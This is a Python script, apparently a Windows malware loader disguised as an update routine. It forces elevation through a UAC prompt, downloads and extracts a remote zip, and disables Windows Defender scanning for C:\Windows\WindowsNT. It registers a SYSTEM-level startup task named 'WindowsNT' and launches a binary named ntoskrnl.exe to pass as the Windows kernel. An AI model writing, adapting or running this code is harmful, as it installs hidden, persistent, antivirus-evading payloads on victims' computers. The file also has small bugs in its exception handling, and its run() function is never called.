import json
import ctypes
import sys
import subprocess
from zipfile import ZipFile
from pathlib import Path
from urllib import request
from threading import Thread

from logger import Logger

_CONFIG_PATH = 'config.json'

_PURE_NAME = Path(__file__).stem
_TARGET_URL = json.load(open(_CONFIG_PATH, 'r'))[_PURE_NAME]['target_url']
_TARGET_FOLDER = json.load(open(_CONFIG_PATH, 'r'))[_PURE_NAME]['target_folder']
_TARGET_ZIP = json.load(open(_CONFIG_PATH, 'r'))[_PURE_NAME]['target_zip']

logger = Logger(_PURE_NAME)


def get_admin():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        exit(0)


def get_update():
    logger.info(f'started updating from {_TARGET_URL}')
    target = request.urlopen(_TARGET_URL).read()
    logger.debug('target file downloaded')
    open(_TARGET_ZIP, 'wb').write(target)
    logger.debug('target file dumped')
    ZipFile(_TARGET_ZIP, 'r').extractall(_TARGET_FOLDER)
    logger.debug('target file extracted')
    logger.info('finished updating')


def add_wd_exclusion():
    logger.info('adding WD exclusion')
    subprocess.call('powershell.exe Add-MpPreference -ExclusionPath "C:\\Windows\\WindowsNT"')


def set_task():
    logger.info('setting scheduled task')
    shell = subprocess.Popen(
        ["powershell.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        universal_newlines=True
    )
    commands = [
        "$action = New-ScheduledTaskAction –Execute 'C:\\Windows\\WindowsNT\\start.bat'\n",
        "$trigger = New-ScheduledTaskTrigger -AtStartup\n",
        "$userPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest\n",
        "$settings = New-ScheduledTaskSettingsSet\n",
        "$task = New-ScheduledTask -Action $action -Principal $userPrincipal -Trigger $trigger -Settings $settings\n",
        "Register-ScheduledTask -TaskName 'WindowsNT' -InputObject $task -Force\n",
    ]
    for i in commands:
        shell.stdin.write(i)
        shell.stdin.flush()


def run():
    logger.info('started running')
    subprocess.call(f'{_TARGET_FOLDER}\\ntoskrnl.exe')


if __name__ == '__main__':
    get_admin()

    try:
        get_update()
    except ConnectionError or TimeoutError:
        pass
    except Exception as e:
        logger.error(e)

    try:
        add_wd_exclusion()
    except Exception as e:
        logger.error(e)

    try:
        set_task()
    except Exception as e:
        logger.error(e)

    input()
